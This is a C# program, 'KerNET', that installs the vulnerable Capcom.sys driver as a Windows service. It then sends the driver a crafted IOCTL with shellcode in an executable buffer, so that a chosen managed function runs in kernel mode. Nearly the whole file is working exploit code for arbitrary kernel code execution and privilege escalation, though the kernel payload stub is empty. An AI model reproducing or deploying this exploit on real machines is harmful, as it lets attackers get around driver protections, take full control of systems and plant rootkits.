﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Diagnostics;
using System.Reflection;

namespace KerNET {
    unsafe class Program {
        static IntPtr CreateService(string Name, string BinaryPath) {
            IntPtr SCManager = Native.OpenSCManager(null, null, SCM_ACCESS.SC_MANAGER_CREATE_SERVICE);

            if (SCManager == IntPtr.Zero)
                throw new Exception("Could not open SCManager");

            if (!File.Exists(BinaryPath))
                throw new FileNotFoundException("Driver not found", BinaryPath);

            IntPtr Ret = Native.CreateService(SCManager, Name, Name, 0xF01FF, 0x1, 0x3, 0x1, BinaryPath, null, null, null, null, null);
            Native.CloseServiceHandle(SCManager);
            return Ret;
        }

        static IntPtr OpenService(string Name) {
            IntPtr SCManager = Native.OpenSCManager(null, null, SCM_ACCESS.SC_MANAGER_CONNECT);
            IntPtr Ret = Native.OpenService(SCManager, Name, SERVICE_ACCESS.SERVICE_START);
            Native.CloseServiceHandle(SCManager);
            return Ret;
        }

        static IntPtr CreateService(string BinaryPath) {
            return CreateService(Path.GetFileNameWithoutExtension(BinaryPath), BinaryPath);
        }

        static void WritePtr(IntPtr Ptr) {
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("0x{0:X}", Ptr.ToInt64());
            Console.ResetColor();
        }

        static bool Try(string Desc, Func<bool> A) {
            Console.Write(Desc);
            Console.Write(" ... ");

            bool Result = false;
            Exception Ex = null;

            try {
                Result = A();
            } catch (Exception E) {
                Ex = E;
            }

            if (Result) {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("OKAY");
                Console.ResetColor();
            } else {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("FAIL");
                Console.ResetColor();
            }

            if (Ex != null && !Debugger.IsAttached)
                throw Ex;

            return Result;
        }

        static void Main(string[] args) {
            Console.Title = "KerNET";

            string ServiceName = "Capcom";
            string FileName = Path.GetFullPath(ServiceName + ".sys");
            IntPtr Capcom = IntPtr.Zero;

            if (!Try("Opening service", () => {
                return (Capcom = OpenService(ServiceName)) != IntPtr.Zero;
            })) {
                Try("Creating service", () => {
                    return (Capcom = CreateService(ServiceName, FileName)) != IntPtr.Zero;
                });
            }

            Console.Write("Capcom = ");
            WritePtr(Capcom);

            Console.WriteLine("Starting service and ignoring result");
            Native.StartService(Capcom, 0, new string[] { });

            FuckShitUp();

            Console.WriteLine("Done!");
            Console.ReadLine();
        }

        static void FuckShitUp() {
            IntPtr CapFile = IntPtr.Zero;
            if (!Try("Creating driver file handle", () => (CapFile = Native.CreateFile("\\\\.\\Htsysm72FB", FileAccess.ReadWrite,
                FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero)) != IntPtr.Zero))
                return;

            Console.Write("File handle = ");
            WritePtr(CapFile);

            IntPtr InBuffer = Native.VirtualAlloc(IntPtr.Zero, (IntPtr)1024,
                   AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);

            if (!Try("Allocating shellcode buffer", () => (InBuffer != IntPtr.Zero)))
                return;

            // Prepare everything
            foreach (var T in Assembly.GetExecutingAssembly().GetTypes()) {
                foreach (var Method in T.GetMethods(BindingFlags.DeclaredOnly | BindingFlags.NonPublic |
                    BindingFlags.Public | BindingFlags.Instance | BindingFlags.Static)) {
                    RuntimeHelpers.PrepareMethod(Method.MethodHandle);
                }
            }

            RuntimeMethodHandle FuncRuntimeHandle = typeof(Krnl).GetMethod("Entry").MethodHandle;
            //RuntimeHelpers.PrepareMethod(FuncRuntimeHandle);
            IntPtr FuncPtr = FuncRuntimeHandle.GetFunctionPointer();

            Console.Write("Krnl.Entry = ");
            WritePtr(FuncPtr);

            IOCTL_IN_BUFFER* InBufferContents = (IOCTL_IN_BUFFER*)InBuffer;
            InBufferContents->ShellcodeAddr = &InBufferContents->Shellcode;
            SHELLCODE.SetPayload(&InBufferContents->Shellcode, FuncPtr);

            uint BytesReturned;
            int OutBuffer = 0;

            InBuffer = (IntPtr)((long)InBufferContents + 8);
            Native.DeviceIoControl(CapFile, 0xaa013044, ref InBuffer, (uint)Marshal.SizeOf(InBuffer),
                (IntPtr)(&OutBuffer), (uint)Marshal.SizeOf(OutBuffer), out BytesReturned, IntPtr.Zero);

            //FuncHandle.Free();
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate void KernelEntryFunc(Krnl.GetRoutineAddrFunc MmGetSystemRoutineAddress);
    }

    unsafe static class Krnl {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void* GetRoutineAddrFunc(void* PUNICODE_STRING);

        public static void Entry(GetRoutineAddrFunc MmGetSystemRoutineAddress) {
            try {

                //void* DbgPrint = GetSystemRoutineAddress(MmGetSystemRoutineAddress, "DbgPrint");

            } catch (Exception) {
            }
        }

        static void* GetSystemRoutineAddress(GetRoutineAddrFunc MmGetSystemRoutineAddress, string RoutineName) {
            void* RoutineNameU = null;
            NtosKrnl.RtlInitUnicodeString(&RoutineNameU, RoutineName);
            return MmGetSystemRoutineAddress(&RoutineNameU);
        }
    }

    unsafe static class NtosKrnl {
        [DllImport("NtosKrnl.exe", CharSet = CharSet.Unicode)]
        public static extern void RtlInitUnicodeString(void** DestinationString, string SourceString);
    }
}